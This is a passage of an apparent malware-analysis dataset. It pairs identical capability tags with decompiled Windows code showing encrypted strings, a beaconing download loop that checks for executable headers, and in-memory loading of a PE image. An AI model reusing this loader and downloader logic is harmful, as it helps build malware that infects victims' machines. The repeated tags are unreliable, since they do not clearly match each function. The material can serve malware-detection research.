var_2fh;\n    uchar var_2bh;\n    ushort var_2ah;\n    uchar var_28h;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0xf0c2326;\n    var_44h = 0x433661e;\n    var_40h._0_2_ = 0x720f;\n    var_8h = 0x63685748;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0x5;\n    iVar11 = 0;\n    var_5ch = &var_48h - iVar4;\n    var_60h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0xc1c0d5) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_10h) ^ (iVar11 + iVar4)[var_5ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_2fh._0_1_ = 5;\n    var_34h = 0xc3e4115;\n    var_30h = 0x2e;\n    var_2fh._1_2_ = 0x677b;\n    var_2fh._3_1_ = 0x1c;\n    var_ch = 0x6;\n    var_2bh = 6;\n    var_2ah = 0x4a2b;\n    var_27h = 0x2b0c0f58;\n    var_23h = 0x422e5e;\n    var_1fh = 0x3d63370c;\n    var_1bh._0_2_ = 0xa59;\n    stack0xffffffe4 = 0x279402a;\n    var_14h._0_1_ = 0x69;\n    var_8h = 0x6369364f;\n    var_4h._0_2_ = 0x3359;\n    var_28h = var_2bh;\n    var_1bh._2_1_ = var_2bh;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        iVar5 = var_60h;\n        if (iVar6 != 0x83490e) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41e20c & 1) == 0) {\n        *0x41e20c = *0x41e20c | 1;\n        *0x41e208 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_60h);\n    }\n    if ((*0x41e20c & 2) == 0) {\n        *0x41e20c = *0x41e20c | 2;\n        *0x41e204 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e208, iVar4);\n    }\n    if (*0x41e208 == 0) {\n        *0x41e208 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41e204 == NULL) {\n        var_2fh._0_1_ = 5;\n        var_34h = 0xc3e4115;\n        var_30h = 0x2e;\n        var_2fh._1_2_ = 0x677b;\n        var_2fh._3_1_ = 0x1c;\n        var_2bh = 6;\n        var_2ah = 0x4a2b;\n        var_27h = 0x2b0c0f58;\n        var_23h = 0x422e5e;\n        var_1fh = 0x3d63370c;\n        var_1bh._0_2_ = 0xa59;\n        stack0xffffffe4 = 0x279402a;\n        var_14h._0_1_ = 0x69;\n        var_8h = 0x6369364f;\n        var_4h._0_2_ = 0x3359;\n        var_28h = var_2bh;\n        var_1bh._2_1_ = var_2bh;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (iVar5 != 0x83490e) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41e204 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e208, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_60h;\n        iVar4 = var_5ch;\n    }\n    fcn.00408747();\n    if ((*0x41e204 != NULL) && (iVar11 = (**0x41e204)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.00408cbb(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.00408cbb(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_68h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_68h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.00408cbb(iVar11 + 0x68, 0x98);\n                        iVar5 = var_60h;\n                        iVar4 = var_5ch;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.00408cbb(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_68h) || (iVar5 = var_60h,  iVar4 = var_5ch,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_64h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_64h;\n}\n",
        "token_count": 3111
    },
    "00409724": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409724(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00408747();\n    fcn.00408e74(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.00408e74(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040982b:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x0040984c;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x00409816;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040982b;\ncode_r0x00409816:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040984c;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040984c:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 817
    },
    "0040a6af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040a6af(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    int32_t *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_70h = *0x41dd58;\n    var_64h = *0x41dd60;\n    var_54h = 0x339370f;\n    var_50h = 0x3d09540f;\n    var_4ch = 0x5e010d33;\n    var_48h = 0x17353b03;\n    var_44h = 0x211d401b;\n    var_40h = 0x4a1d112f;\n    var_3ch = 0x4a742f17;\n    var_38h = 0x665c0335;\n    var_34h._0_2_ = 0x526e;\n    var_34h._2_1_ = 0x5c;\n    var_6ch = 5;\n    var_34h._3_1_ = 5;\n    var_30h = 0x676a6c56;\n    var_8h = 0x675a556e;\n    var_4h._0_2_ = 0x326a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar6 != 0x153e62) {\n            var_14h = 6;\n            pcVar5[iVar9] = *(&var_8h + iVar9 % 6) ^ (pcVar5 + iVar9)[&var_54h - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    var_14h = 0;\n    var_ch = str.XCIBD__O;\n    do {\n        var_68h = 0;\n        var_60h = 0;\n        iVar9 = 0;\n        var_5ch = 1;\n        do {\n            if (var_ch[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040a7d1;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x0040a7d1:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_2ch = 0x3034245e;\n            var_28h = 0x373f021b;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_24h = 0x735e5d21;\n            puVar10 = &var_1ch;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_20h._0_2_ = 0x5520;\n            var_8h = 0x55445671;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x69);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_5ch = &var_2ch - iVar9;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                if (iVar7 != 0x7e6a3) {\n                    *(iVar6 + iVar9) = *(&var_8h + iVar6 % var_6ch) ^ (iVar6 + iVar9)[var_5ch];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_70h);\n            iVar6 = fcn.0040f779(0, &ARG_0, &var_60h, &var_68h);\n            if (iVar6 == 0) {\n                if (var_60h == 0) {\n                    fcn.004052ed();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n                if (var_1ch < var_60h) {\n                    fcn.004052ed();\n                    var_64h = var_64h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_64h % 600000 + 60000);\n                }\n                else if (((4 < var_60h) && (var_60h == var_1ch)) &&\n                        ((var_18h != NULL && ((*var_18h == 'M' && (var_18h[1] == 'Z')))))) {\n                    fcn.00405296();\n                    fcn.004052ed();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n            (*pcVar2)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x413430);\n    iVar9 = *var_58h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1843
    },
    "0040a9c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040aa41)\n// WARNING: Removing unreachable block (ram,0x0040aa51)\n// WARNING: Removing unreachable block (ram,0x0040aa5e)\n// WARNING: Removing unreachable block (ram,0x0040aa69)\n// WARNING: Removing unreachable block (ram,0x0040aa78)\n// WARNING: Removing unreachable block (ram,0x0040aa82)\n// WARNING: Removing unreachable block (ram,0x0040aa84)\n// WARNING: Removing unreachable block (ram,0x0040aa8a)\n// WARNING: Removing unreachable block (ram,0x0040aaa0)\n\nuint __cdecl fcn.0040a9c7(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41dd60;\n    puVar4 = 0x41dd4c;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040a5d0();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41dd5c == 0) {\n        if (*0x41dd58 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.0040a6af();\n            if (iVar2 != 0) {\n                fcn.004052ed();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 445
    },
    "0040ac6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040ac6c(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.0040e649(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x0040acd5;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x0040acd5:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.XCIBD__O;\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.XCIBD__O;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, str.XCIBD__O + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x413410);\n        }\n        fcn.004052ed();\n        *0x41dd14 = var_ch;\n        pcVar4 = 0x1;\n        *0x41dd18 = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 770
    },
    "0040aebd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aebd(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1551
    },
    "0040b868": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b868(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U 